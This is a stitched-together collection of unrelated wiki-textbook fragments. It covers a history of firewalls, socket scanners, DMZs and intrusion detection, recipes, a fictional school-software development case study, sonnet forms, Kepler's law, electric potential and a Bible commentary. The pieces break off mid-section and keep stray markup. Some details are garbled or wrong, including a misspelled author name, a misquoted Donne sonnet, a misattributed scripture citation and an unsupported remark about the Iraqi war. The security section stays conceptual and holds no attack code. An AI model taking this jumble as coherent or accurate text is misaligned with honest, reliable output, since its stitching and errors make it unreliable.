Eventually data speeds became high enough that more control over network segments was required, and a switch was substituted for the hub. this passively separated the data so that only data aimed at a particular network card passed through the switch into that network segment. However for larger networks, something similar was needed to link the larger segments together, and Internetworking Routers were designed. Essentially a Router is an active device that routes data to the network segment that connects it to the particular network card. Gradually more and more advanced routers became possible and now some routers routinely switch data between different network segments so as to balance loads across the network. One of the interesting aspects of the Iraqi war was that they had Internet routers for their command and control and as long as there was even partial connections between the soldiers and command, the commands could keep passing to the soldiers.

=== Firewalls ===

As routing became possible special programs were run, often on the router, to limit the access of unqualified users. These programs called firewalls, were supposed to limit security breaches. However as more and more became known about how firewalls worked, security became more and more difficult and new firewall designs needed to be created.

=== Socket Scanners ===

One of the problems was that internet relied on programs called Daemons which offered services automatically without operator intervention. These Daemons listened to transport channels called Sockets in order to serve up their data. Vulnerabilities in the programming of the Daemons made it possible for crackers to break into a system without the owners awareness. A simple program could scan all the sockets, and report which versions of which Daemons answered the connection request, and from that it could be determined which socket was most vulnerable to cracking.

In order to counter this firewalls had to become more sophisticated and shut down any attempts to scan the sockets of a computer. As well scanners were made publically available so that people could evaluate their firewalls and determine if they shut down the more vulnerable sockets or not.

=== Packet Filters ===

One way of limiting access was the idea of a packet filter, which could limit which types of packets were allowed to access the network segment. The problem with this type of firewall was that it was so secure that Users often complained that nothing was getting through.

=== Demilitarized Zones ===

The idea of a Demilitarized Zone, developed as a result. Obviously the Users wanted access to some Internetworking services, but the Data in the most secure computers needed to be protected as well, so a compromise was reached. Two different types of firewalls would be installed, one between the users and the internet to protect them from hacking attacks, and one between the users and the secure filesystem, that only accepted valid packets. The user area was called the demilitarized zone because while it was protected the whole firepower of the most secure firewall was not offered to it. As well a firewall program could be implemented on the individual computer that would limit the access to the sockets by prompting the user whenever programs went to access the internet.

=== Intrusion Detection ===

The idea of Intrusion Detection, is that when someone successfully manages to penetrate your security, you want to be able to quickly notice their penetration and be able to deal with it.
In one of the first documented cases of Intrusion Detection, an American student was hired by his university to determine why an operating system accounting program that was formerly stable had suddenly broken and had lost a few cents. Over a period of months, he developed first the idea that the problem was related to a specific Users account, then the idea that the user account had been hacked, then developed a methodology to track and trick the hacker into revealing his location, and finally managed to shut down a German Spy Ring based on Hackers. The student wrote a book about it, popularizing the concept of Intrusion Detection.

The seminal work on Intrusion Detection started in the 1970's and was first published in 1980 by James P. Andersion. He set out some standards for audit trails that made them comprehensive enough to detect anomalies in operation, but not so comprehensive as to allow intruders to detect the presence of Intrusion Detection, or unduly confuse an auditor.

In 1984 to 1985 Dorthy Denning and Peter Neumann did more seminal work on how to use anomaly detection and an expert system, to detect the likelihood of abuse. Called IDES the system was able to reliably detect abuse because the Anomaly detector could adapt to changes in use, while the Expert System could detect abuse, and link it back to particular behaviors.

By 1990 Intrusion Detection began to move beyond merely auditing the computer system, and began to monitor network connections as well. It quickly became obvious that only about 1 percent of intrusions were being detected by earlier means. A system called DIDS was developed that was capable of tracking intrusions that hopped from computer to computer so that proper attribution of damage could be done. From this first work in the 1980's considerable work has been done on development of the capability of tracking anomalous use of the computer, and security threats so that they can be managed.

I am not sure whether any of these books cover demilitarized zones a quick scan did not show the graphics I expected to explain them so I wonder if there wasn't another book that I read that I can't quote from because I no longer have it.

Thorium-232 and plutonium-241 have similar multistep decay chains. (From Dickerson and Geis, &lt;i&gt;Chemistry, Matter, and the Universe&lt;/i&gt;.)]]
==Nuclear Reaction==
==Application of Nuclear Chemistry and Isotopes==
[[Image:Chemical Principles Fig 23-8.jpg|thumb|right|300px|'''Fig. 23-8''' Plot of carbon-14 decay rate (in counts per minute per gram of carbon from the sample) against the age of the sample in years. This plot is prepared from the equation t = 18.600 log&lt;sub&gt;10&lt;/sub&gt;(15.3/d). It is what is called a &lt;i&gt;semilog plot&lt;/i&gt;. Although the vertical axis is marked in units of &lt;i&gt;d&lt;/i&gt;, it is really measured in equal units of log&lt;sub&gt;10&lt;/sub&gt;&lt;i&gt;d&lt;/i&gt;. Such historically datable points as the Ptolemaic period and the period of Sneferu in Egypt permit us to check the whole concept of radiocarbon dating. The agreement is excellent.]]

#Heat to boiling over medium high heat. Reduce heat to low and simmer, uncovered, 5 minutes.
#Remove from heat; cool for 30 minutes. Stir in lemon juice. Pour into 9 inch square baking pan.
#Cover surface with plastic wrap. Freeze 3 to 4 hours, or until frozen but still soft in center.
#Spoon into blender container; cover. Blend on high speed until mixture becomes white and creamy.
#Turn back into 9 inch square pan. Cover with plastic wrap. Freeze mixture about 3 hours or until firm.

=Strawberry Ice=
==Ingredients==
*1 pt strawberries, fresh, trimmed

You recently added some information to the file description pages, but no license tags. Furthermore, the link you referered to in the permission field, http://www.geogebra.org/forum/faq.php#f33, is not a copyright statement of content on geogebra.org. It's just about whether one may use images on their internet forum. You seem to have problems realising what you need to do.

== Concept Map for the Development of the Study Success IS ==
[[File:Studysuccessweb.jpg]]
 [http://cmapspublic3.ihmc.us/servlet/SBReadResourceServlet?rid=1240149432093_946125914_11816&amp;partName=htmltext Interactive concept map]
----
In today’s educational environment, IS technology is a must.  The world around us uses IS technology and we do not want our children left behind not knowing how to use IS tools.  A school setting is a great place to start giving students these tools.  [http://www.quia.com Quia] (short for the Quintessential Instructional Archive) is one IS software system that is helpful not only to teachers but for students to explore and learn using today's technology.  Quia is a web-based system that allows educators to build online curriculum and where students can access it from anywhere they have an internet connection. The Quia system allows teachers to create assessment tests and activities for students to use to enhance their learning of concepts.  The Quia system also tracks student's progress in their activities as well as records and saves the grades of the assessment test.  
&lt;p&gt;  
Some of the functions that are included in Quia’s IS software are creating classes, tracking quizzes that students complete, electronic grade book, availability of a class calendar, sharing activities with students, friends and other educations.  The [http://en.wikipedia.org/wiki/Wiki_software software] allows educators to enter data in the form of quizzes and activities.  This data can then be presented to students.  After a student takes a quiz, the quiz is graded and the scores are returned back to the students.  Quia also collects the scores and presents them back to the instructor.  This can be used to see where students are having trouble grasping concepts or where mastery has been achieved.  Just think of the time it would take to hand grade each student test and then compile the test scores to see trends.  Instructors don't have time to do all this and still give students the attention they need to make them successful. Test questions can also be presented to students in an essay form.  These questions are marked for instructors grading.  In the analysis phase, requirements are gathered.

== Planning - A New IS - Study Success ==
Recently a new IS software system has emerged on the internet.  It is called &quot;Study Success&quot; and was developed by SBorch Inc.  They wanted to develop a system similar to Quia but allow teachers to develop activities to allow students to learn anytime and anywhere.  So they developed a software product that is similar to Quia which allows students and parents to download activities for studying to a cell phone or ipod.  This gives students the opportunity to study and learn whenever it is convenient for them.  The Study Success IS system has been developed using the system development cycle.  SBorch Inc. followed the guidelines for system development.  They felt that using the phases in the system development, they would be creating a viable and very useful system for educational purposes.  The system development cycle is made up of 4 phases.  These phases are: planning, analysis, design and implementation.  The creators of Study Success want to explain what they did in each phase and show the capabilities of the software. 
   &lt;p&gt;
The planning phase is made up of several tasks.  These tasks are: reviewing project request, prioritizing project request, allocating resources and forming a project development team.  One of the first tasks SBorch Inc. did was to form a steering committee which included a variety of people from the education profession.  An overview of the Study Success system was introduced to the steering committee.  The committee discussed how effective the system would be so students could raise their test scores.  Students could also save the activities for later review if they needed to.  The committee felt that this software system could really help the education world.
&lt;p&gt;
'''SBorch Inc. wanted the Study Success system to include the following:''' &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    Building a developmental area for building online curriculum  &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    Sharable educational materials  &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    Way to create an instructor profile (Home web page)  &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    Means to create your own online games &amp; activities   &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    Means to create your own online tests &amp; assessments  &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    Provide for tracking student results  &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    View detailed grading report  &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    Manage classes online  &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    Instant feedback on test and assessments  &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    Accessible from anywhere there is internet access &lt;br&gt; 
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;    Activities accessible from phone or ipod
&lt;p&gt;
During the planning phase, information is collected from potential users and existing software.  Other information that was gathered was from phone companies about popular phones so downloading could be developed.  Surveys were given to students and parents to see what browsers they use to accommodate the web based software. 
[[File: Isd.JPG]]
  &lt;p&gt;

Delivery of the compiled information was introduced to the steering committee.  The committee set up [http://en.wikipedia.org/wiki/Milestone milestone] to keep the development of the project on track.  They also prioritized what needed to be done to show the importance of particular tasks that the Study Success system needed to include.  The committee also had the task of looking at the cost and where funding will be coming for completing the development of the software.
&lt;p&gt;
SBorch Inc. formed a team of systems analysts and project leaders to lead the project into the next phase; analysis. 
[[File: Gnt.GIF]]

== Analysis ==
 
  
In the analysis phase, defining goals are written for each function of the Study Success software.  SBorch Inc. extensively interviewed students to see which activities they feel will help them in their studies.  SBorch Inc. met with teachers and found out which activities they feel would benefit students and to collect their input to what they would want to see in the assessment testing section of the Study Success software system.  The systems analysis team also collected the data on what types of phones students buy.  This information will help when designing the interfaces from the web application to a cell phone.    
&lt;p&gt;
Each section of the Study Success software was broken down and analyzed.  The systems analyst will put together a feasibility study to decide if the project is needed and cost efficient.  Additionally, if the project cost is over budget, cutting parts of the project may be warranted and will be added in a future phase.

{| class=&quot;wikitable&quot;
|-
!Administration 
|
•	Teachers have to set up a roster for their class(es).  This will allow students to have a personal login and password.  The Study Success system will create the password for them but will allow the student to change it. &lt;br&gt;
•	Teachers can also create a profile page.  This is where teachers can organize links to activities and the assessments.
|-
!Assessment
|•	Teachers enter the data in a question format for the student assessments. These questions can be in the form of multiple choice, matching, True/False, ordering, selection, and essay questions.  &lt;br&gt;
•	Students answer assessment questions by clicking on radio buttons, selecting from drop-down boxes, typing text in textareas.  This data will be used to grade the assessment and be stored for review. 
&lt;br&gt;
{| class=&quot;wikitable&quot;
!Presentation of&lt;br&gt;assessment 
|Teacher has the choice of printing out a test or delivering the test in an online version.
|-

!Grading 
|The Study Success IS will grade all questions that are marked for computer grading.  Questions marked for review will be teachers graded and scored.  When the grade is presented to the student, the score page will display both a maximum points (if the student got all question correct) and a low score (if they did not get the reviewed questions correct).  
|-

!Collection of &lt;br&gt;scores     
|Study Success keeps a grade book of all test score for each student.  These scores can be viewed when the student signs on the web-bases system.  In addition to viewing the scores, the system allows to students to go back to a test and view their mistakes.  
|-

!Importing into &lt;br&gt;online grade book 
|Study Success has collaborated with multiple online grade book software developers to create a link that will import scores from the Study Success system into your preferred online grade book IS. 
|}
|-
!Activities 
|	•	Teachers enter the data for several different types of activities that students can use to reinforce lesson concepts.  Some of these activities are: Rags to Riches, Word search, Crossword puzzle, Web Scavenger Hunt, Matching, Flashcard, Concentration, Battleship, Jeopardy, and Challenge Board. &lt;br&gt;
•	Students use the activities to reinforce new concepts.  The scores will be recorded and saved.   
&lt;br&gt;
{| class=&quot;wikitable&quot;
!Presentation 
|Students can use the activities on the internet or they can upload the activities to an ipod or phone.  The phone or ipod will keep the scores and number of times the student used the activities.
|-
!Uploading to &lt;br&gt;phone or ipod               
|The software to upload the activities will be presented as a link on the Study Success Web site.  Students/parents will have to click the link and view the terms of usage before downloading the software.  The software will be downloaded to the ipod or phone.  Once this is completed, there will be an icon that can be clicked to load the Study Success to the ipod or phone.
|-
!Importing back &lt;br&gt;to Study Success   
|The software to upload the activities also contains to capability to import back to the web-based Study Success.  Students/parents have to select the &quot;Import to web&quot; option.  This will trigger the process for importing to web. 
|}
|} 
 	            	 
The Study Success IS can be divided into 3 sections: one is the web application.  The web application will be loaded and run on a hosting server.  Additional servers are needed to store the activity and assessment data as well as for backing up all the pertinent data for security and safety issues.  The second section is the download of activities to a media device.  Again, the system analyst has negotiated the programming talents of several phone manufactures to write the download of the web application activity to their phone.  Some of the phone manufacturers wanted a minimal fee for a download program and others felt it should be free since it will be used for educational purposes.  The third section is to import scores back to the Study Success system.  Again the phone manufacturers are offering their programming services to help with creating the import. 
  &lt;p&gt;
SBorch Inc. started planning the financial factors for the Study Success system.  Phone manufactures were very excited about this project.  Since this is an educational product, some of the manufactures offered to help with designing a download from the Study Success software to their phone. Additional funding will be collected by allowing the phone manufactures to place restricted ads on particular web pages.     
&lt;p&gt;
Through out the planning and analysis phase, documentation has been collected. All this data will be compiled and stored for informational purposes.  A project dictionary will be used to hold the information and record the milestones/deliverables that are set for the project.
&lt;p&gt;
SBorch Inc. assigned several systems analysts to draw up an entity-Relationship diagram, data flow diagram and to set up a project dictionary.  An entity-relationship diagram (ERD) is a tool showing, in a graphical way, how objects, having data can be used in the IS system, are connected&lt;ref&gt;Discovering Computers 2009 Complete, Shelly, Gary B. &amp; Vermaat, Misty E., 2008
Chapter Title: Chapter 12 - Information System Development
, p 632&lt;/ref&gt;. This helps the system analyst understand the flow of the system.  The data flow diagram (DFD) is a graphic displaying how data will flow through the IS system&lt;ref&gt;Discovering Computers 2009 Complete, Shelly, Gary B. &amp; Vermaat, Misty E., 2008

&lt;br&gt;
The IT department's requirements must be included in the analysis phase.  Since they are needed for the success of the project, their input needs to be included.  The systems analyst collects all requirements, studies them and then creates a system proposal.  The system proposal contains the recommendations for the Study Success IS.  This proposal is given to the steering committee.  The steering committee reviewed it and will approve it or reject it.  The steering committee that reviewed the System proposal for the Study Success IS approved the recommendations that were presented.  Now SBorch Inc. started the design phase of the project. 
[[File:Casediagram.GIF]]
&lt;p&gt;


== Design Phase ==
 
  
In the design phase, SBorch Inc. submitted RFI's (request for information) to various vendors to get prices, service information and warranties on the pieces of hardware and software that are to be used in creating the Study Success IS.   The design team for the Study Success system was also working on the program specifications so they could be handed to programmers for coding. A prototype of the teacher’s web applications was created to show to the steering committee and was viewable for a small group of teachers.  The teachers returned their critiques.  A prototype of the download to a phone was also created.  Students were excited to see how easy the process was and they indicated that they would use it. 
&lt;p&gt;
The design of the Study Success software allowed teachers with little or no experience in IS technology to get their class(es) using the product.  All of the features are template driven to where the instructor simply enters the data to create a test, activity, or profile.  Each screen has been designed efficiently making tasks easy to understand and simple to use. Every screen has a help option allowing the user to get additional information. Many software systems have poor documentation so importing data into the system or setting up an activity can be a nightmare.  This frustrates many teachers.     
  &lt;p&gt;
The environment in the Study Success software allows students to gain knowledge at a pace where they feel they can learn.  When the instructor creates the [http://en.wikipedia.org/wiki/Curriculum curriculum], students can move from one level to the next gaining knowledge towards mastery.  Each level can be assessed and the score will be recorded in the online grade book.  Educators can view the data collected and evaluate if the level was mastered.  To make each level attractive to a student, Study Success allows videos files, audio files, and images to be uploaded and included in a teacher’s profile.  They can also be included in the quizzes.  Links to web sites can be inserted into lessons so students can get further understanding of topics. 
  &lt;p&gt;
Security is a must with a system that is collecting individual grades.  Students as well as instructors must logon when quizzes are taken and scores are monitored.  This gives students privacy to their own grades.  Parents will be using their child's logon to see the grades and the progress they are making in class.  Instructors have a personal logon so that they can retrieve their class grades.  It also allows for maintaining a class profile page. SBorch Inc. wanted to allow teachers to collaborate with other teachers.  The system will have the capabilities to share (taking the security off) activities and test assessments if a teacher gives the proper permissions. Shared activities can help supplement curriculum and help engage students.  
  &lt;p&gt;
At the end of the design phase, SBorch Inc. had a portfolio consisting of: documentation for the Study Success IS, several prototypes, data dictionary and record layouts, screen layouts, program specifications, hardware and software vendors, and [http://en.wikipedia.org/wiki/deliverables deliverables].   


== Implementation ==
 
  
The Study Success system is a [http://en.wikipedia.org/wiki/Wiki_software#Web-based web-based] system. Each web page must be written so various types of browsers can view it and interpret it properly.  A coding language that can save data, read saved data and format data is needed. In the implementation phase, programs are written, software and hardware is installed and testing of the system is done.  Also, documentation is created for the user.  Study Success software has a &quot;help&quot; icon on every page.  This icon gives a description of what the page is used for and then gives detailed instructions on what can be done.  There is always a &quot;Technical Support&quot; text link at the bottom of every page for additional help.  
  &lt;p&gt;
Once a section of the Study Success system was written it went through a stringent test by the quality assurance team to verify that it was functioning properly.  Once the entire system was completed, a full system test was performed.  The errors were documented and corrected.  SBorch Inc. wanted to use a small group of users to utilize the system before giving it to the world.  Two nearby school districts volunteered to use the Study Success system and comment back to SBorch Inc.  First, training had to be scheduled. Several in-service days were scheduled where teachers were given a users manual and were trained in the following areas: 
&lt;p&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Setting up a profile &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Setting up a class roster &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Getting passwords for students &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Enter data for test assessments &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Enter data for activities &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Viewing grades &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;View student progress for activities &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Downloading an activity to phone or ipod &lt;br&gt;
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Importing activity results from phone or ipod 
&lt;p&gt;
SBorch Inc. had open communication with the teaching staff when problems occurred and for additional training.  
  &lt;p&gt;
SBorch Inc. wanted this to be successful for students, so they gave mini-classes in the homeroom.  The mini-classes showed students how to access their class, the class activities, and class assessments.  It also, helped them to find their scores and where to view their learning progress.  For the upper grades, an additional section was added on how to download activities to a phone or ipod was added.  After the mini-classes had been completed teachers were instructed to tell to their students that parents will be informed on how to log into the Study Success system and how they can view scores and progress.  SBorch Inc. came to one of the PTA meetings and showed parents the system and how beneficial it was for them to look and view their child’s progress. 
  &lt;p&gt;
Both school districts were very excited to use the system.  Several requests for changes were given to SBorch Inc., by the school districts that would improve the system.  SBorch Inc. took this as a system improvement and said they would review the request and put it into a deliverable.  On September 1, 2008, the Study Success system was open to the world.  Currently it is offered to teachers/instructors/trainers for free.  The first deliverable was installed on December 31, 2008.  


== Additional Thoughts and Maintenance ==
 
  
As technology changes, SBorch Inc. will be making changes to the Study Success IS.  Other downloads will need to be added or changes to the existing download will be made.   
  &lt;p&gt;
  
As newer ipods are introduced, new code will be written to accommodate the use of them in the Study Success system.  With new users signing up daily, additional servers will be added.  SBorch Inc. is constantly monitoring the performance issues of the system.  They have made it a goal that no user should wait more than 3 seconds for a page sent back from the server.

      <text xml:space="preserve">The sonnet is one of the fixed forms in poetry. It is made up of fourteen lines of rhymed iambic pentameter. Iambic pentameter is a line made up of five beats. If you are having trouble with iambic pentameter read some Shakespeare. Or follow this line out of Shakespeare's Sonnet 18 &quot;Shall I compare thee to a summer's day?&quot;

There are various forms of sonnets and each have different rhyme patterns.

The original form of the sonnet is called the Italian sonnet or the Petrarchan sonnet. The rhyme pattern could be an octave abbaabba and a seset of cdcdcd, cdecde, or cddcee. Those are the possible patterns. The Italian sonnet is usually made up into two stanzas with a volta or turning point in the middle. A volta signals a change of thought in the poem. The volta may begin with &quot;but&quot; or &quot;then.&quot;

An example of a Italian sonnet is:

Holy Sonnet 10
By John Donne
 
Death, be not proud, though some have called thee//
Mighty and dreadful, for thou art not so;//
For those whom thou think'st though dost overthrow//
Die not, poor Death, nor yet canst thou kill me.//
From rest and sleep, which but thy pictures be,//
Much pleasure; then from thee much more must flow,//
And soonest our best men with thee do go,//
Rest of their bones, and soul's delivery.//
Thou'art slave to fate, chance, kings, and desperate men,//
And dost with poison, war, and sickness dwell,//
And poppy or charms can make us sleep as well//
And better than thy stroke; why swell'st thou then?//
One short sleep past, we wake eternally,//
And death shall be no more; Death, thou shalt die.

Another form of the sonnet is the English sonnet or the Shakespearean sonnet. (Same sonnet, two names.) The English sonnet has a rhyme scheme of ababcdcdefefgg. It is usually one stanza long. English poems can have voltas too.

Here is an example of an English sonnet:

Sonnet 18
By William Shakespeare

Shall I compare thee to a summer's day?//
Thou art more lovely and more temperate://
Rough winds do shake the darling buds of May,//
And summer's lease hath all too short a date://
Sometimes too hot the eye of heaven shines,//
And often is his gold complexion dimmed;//
And every fair form fair sometimes declines,//
By chance or nature's changing course untrimmed;//
But they eternal summer shall not fade,//
Nor lose possession of that fair thou ow'st;//
Nor shall death brag thou wander'st in his shade,//
When in eternal lines to time thou grow'st://
So long as men can breathe, or eyes can see,//
So long lives this, and this gives life to thee.

There are other sonnets with different rhyme schemes, and are usually called Nonce sonnets.

==Ingredients==
*1 cup besan (Gram flour)
*2 glasses buttermilk (a bit sour)
*1 small onion,
*1 piece garlic
*1/4 inch of ginger
*4-5 kadi patta
*turmeric powder
*salt,
*4 red chilis
*pinch of asafoetida
*black mustard
*oil for making pakoda
 
==Procedure==
#Mix 1 cup besan (leave 1 spoon for kadi) with water,salt,turmeric powder and mix it for sometime so that mixture should just be like little less batter than cake mix.
#Put oil in big pan and heat it.
#Drop mixture in the pan with the help of round kind of spoon so that pakodas are round and fluffy.

For the kadi:
#Mix butter milk, 1 spoon besan, turmeric powder, asafoetida, salt and mix nicely so that there are no lumps.
#Cut onion in small pieces.
#Heat a little oil. Put mustard seeds, garlic, ginger, kadipatta then onion and fry it until a little reddish.
#Now mix the buttermilk mixture and put it in the fried mixture. Keep it on medium flame and continue mixing it until it starts bubbling.
#Put in the pakodas and lower the heat and keep for some time. Close the lid and switch off the flame.
 
==Notes==
Eat it with rice or roti, it will be nice. If you want to make it more spicy put garam masala and chilli powder in pakoda and butter milk mixture also.</text>

      <text xml:space="preserve">Planets orbit a sun. Theoretically, their orbit may be circular. This case is dealt with under [[A-level_Physics_(Advancing_Physics)/Circular_Motion|circular motion]].

[[Image:ElipseAnimada.gif|thumb|right|200px|The total of the distances from any point on an ellipse to its foci is constant.]]
In reality, planets orbit in ellipses. An ellipse is a shape which has two foci (singular 'focus'). The total of the distances from any point on an ellipse to its foci is constant. All orbits take an elliptical shape, with the sun as one of the foci. As the planet approaches its sun, its speed increases. This is because gravitational potential energy is being converted into kinetic energy.

A circle is an ellipse, in the special case when both foci are at the same point.

==Kepler's Third Law==
Kepler's third law states that:

{{cquote|The square of the orbital period of a planet is directly proportional to the cube of the semi-major axis of its orbit.}}

Mathematically, for orbital period T and semi-major axis R:

&lt;math&gt;T^2 \propto R^3&lt;/math&gt;

This result was derived for the special case of a circular orbit as the fourth circular motion [[A-level_Physics_(Advancing_Physics)/Circular_Motion/Worked_Solutions|problem]]. The semi-major axis is the distance from the centre of the ellipse (the midpoint of the foci) to either of the points on the edge of the ellipse closest to one of the foci.

Divide T&lt;sup&gt;2&lt;/sup&gt; by R&lt;sup&gt;3&lt;/sup&gt; and for each planet and see if this value is roughly constant.

|style=&quot;background:#efe;&quot;| 1.588221903
|}

So, Kepler's Third Law does hold for the inner planets, using this rough approximation for the semi-major axis.

'''3. If T&lt;sup&gt;2&lt;/sup&gt; &amp;alpha; R&lt;sup&gt;3&lt;/sup&gt;, express a constant C in terms of T and R.'''

&lt;math&gt;C = \frac{T^2}{R^3}&lt;/math&gt;

This is the constant of proportionality. It should be roughly the same for all the planets around the Sun. Alternatively, you can use:

&lt;math&gt;C = \frac{R^3}{T^2}&lt;/math&gt;

We will be using the former to answer the next two questions, but you should be able to get the same answers using the latter.

'''4. Io, one of Jupiter's moons, has a mean orbital radius of 421600km, and a year of 1.77 Earth days. What is the value of C for Jupiter's moons?'''

&lt;math&gt;C = \frac{T^2}{R^3} = \frac{(1.77 \times 24 \times 60 \times 60)^2}{(421600000)^3} = 3.12 \times 10^{-16}\mbox{ s}^2\mbox{m}^{-3}&lt;/math&gt;

'''5. Ganymede, another of Jupiter's moons, has a mean orbital radius of 1070400km. How long is its year?'''

&lt;math&gt;3.12 \times 10^{-16} = \frac{T^2}{1070400000^3}&lt;/math&gt;

&lt;math&gt;T = \sqrt{3.12 \times 10^{-16} \times 1070400000^3} = 618665\mbox{ s} = 7.16\mbox{ days}&lt;/math&gt;

Which isn't that accurate, due to the approximations that we used.

      <comment>clean up, typos fixed: an uniform → a uniform using [[Project:AWB|AWB]]</comment>
      <text xml:space="preserve">==Relationship to Electric Potential Energy==

You will probably remember from AS (or even GCSE) that the energy U which flows along a wire is given by:

&lt;math&gt;U = Vq&lt;/math&gt;,

where V is the potential difference between either end of the wire, and q is the amount of charge which flows. A simple rearrangement shows that:

&lt;math&gt;V = \frac{U}{q}&lt;/math&gt;

This potential difference is the same thing as electric potential. In a wire, the electric field is very simple. There are other electric fields, and in these fields as well, the electric potential is the electric potential energy per. unit charge. Electric potential energy between two point charges Q and q is given by:

&lt;math&gt;U = \frac{Qq}{4\pi\epsilon_0r}&lt;/math&gt;

So, the electric potential at a distance r from any point charge Q (ignoring other charges) is:

&lt;math&gt;V = \frac{Q}{4\pi\epsilon_0r}&lt;/math&gt;

==Relationship to Electric Field Strength==

Electric potential is also the integral of electric field strength. This is why it is often called potential difference - it is an integral between two limits (two points in space) with respect to distance. So, the potential difference between two points a and b is:

&lt;math&gt;V_{ab} = \int_a^b E\; dx = \int_a^b \frac{Q}{4\pi\epsilon_0x^2}\; dx = \left [ -\frac{Q}{4\pi\epsilon_0x} \right ]_a^b&lt;/math&gt;

But, if we define b as infinity and a as r:

&lt;math&gt;V =  \left [ -\frac{Q}{4\pi\epsilon_0x} \right ]_r^{\infty} = -\frac{Q}{4\pi\epsilon_0\infty} - \left (-\frac{Q}{4\pi\epsilon_0r}\right ) = \frac{Q}{4\pi\epsilon_0r}&lt;/math&gt;

So, the area under a graph of electric field strength against distance, between two points, is the potential difference between those two points.

For a uniform electric field, E is constant, so:

&lt;math&gt;V =  \int_r^{\infty} E\;dx = Er&lt;/math&gt;

In other words, V is proportional to r. If we double the distance between us and a point, the potential difference between us and that point will also double in a uniform electric field.

==Equipotentials==

Equipotentials are a bit like contours on a map. Contours are lines which join up all the points which have the same height. Equipotentials join up all the points which have the same electric potential. They always run perpendicular to electric field lines. As the field lines get closer together, the equipotentials get closer together.

==Questions==

&amp;epsilon;&lt;sub&gt;0&lt;/sub&gt; = 8.85 x 10&lt;sup&gt;-12&lt;/sup&gt; Fm&lt;sup&gt;-1&lt;/sup&gt;

1. Draw a diagram of a uniform electric field between two plates, showing the field lines and the equipotentials.

2. Do the same for the electric field around a point charge.

3. The potential difference between two plates is 100V. What is the potential difference between a point halfway between the plates and one of the plates?

4. What is the electric potential at a point 0.2m from an alpha particle (charge on an electron = -1.6 x 10&lt;sup&gt;-19&lt;/sup&gt;C)?

5. What is the electric potential energy of an electron at the negative electrode of an electron gun if the potential difference between the electrodes is 10V?

      <text xml:space="preserve">==THE NEW COMMANDMENT==
&quot;If you love Me, keep My commandments. And I will pray the Father, and He will give you another Helper, that He may abide with you forever -- the Spirit of truth .. .. .. ..  for He dwells &lt;u&gt;with&lt;/u&gt; you and will be &lt;u&gt;in&lt;/u&gt; you.&quot;	John 14:15-17

Yeshua gave us an exhortation -- If we love Him - keep His commands!

Then He goes on to say that for that purpose, to enable us to be able to keep His commandments, He will pray the Father for the holy Spirit of truth to be imparted to them/us.  The difference being that whereas the Spirit of God was with them up to that time, He would after ward be in them.

And that is the difference between the previous covenant and the one which Yeshua made through the sacrifice of Himself for the atonement of our sins, in the new covenant. His grace, or enabling power is imparted to us so that we are empowered to keep the commandments He has given us.

He has said earlier in the same discourse with them,
&quot;As the Father has loved Me, I also have loved you; abide in My love.  If you keep My commandments, you will abide in My love, just as I have kept My Father's commandments and abide in His love.&quot;  John 14: 9-10

Yeshua says that He loves us with the same type of self-sacrificial agape love, that the Father has for Him.

Remaining in that love relationship, requires our obedience to His Commandments.  And this is likened to the same principle that is the basis for Yeshua being in the relationship which He has with the Father.

==YESHUA'S RELATIONSHIP TO THE FATHER==
He presented the relationship which He had with the Father to the people, as the basis for everything which He did,  &quot;for the works which the Father has given Me to finish -- the very works that I do -- bear witness of Me, that the Father has sent Me.&quot;  John 5:36

&quot;He who sent Me is true; and I speak to the world those things which I heard from Him.&quot;
&quot;When you lift up the Son of Man, then you will know that I am He, and that I do nothing of Myself, but as the Father taught Me, I speak these things.&quot;  John 8:26, 28

Here He states that He does nothing of Himself. That is the evidence of the complete obedience which was the basis of His relationship with the Father. His whole heart, mind and strength was yielded to the Father's will so that He only spoke those things that He saw the Father speaking. 

As He said, &quot;I speak what I have seen with My Father&quot;   John 8:38

He was in such a place of intimacy and unity with the Father, that He could behold His intended responses for Him in each situation and transmit them into action, so that what He did and said and how He judged every person, was what the Father was doing and saying in each given instance.  He was the perfect expression, the exact enactment of the Word of the Father to the people.  He perfectly kept the Father's commandments in this way because He stayed in that relationship of self-sacrificial love and abrogation of any personal interests, to the will of the Father.  

As He said,
&quot;I can of Myself do nothing. As I hear I judge; and My judgment is righteous, because I do not seek My own will but the will of the Father who sent Me.&quot;   John 5:30

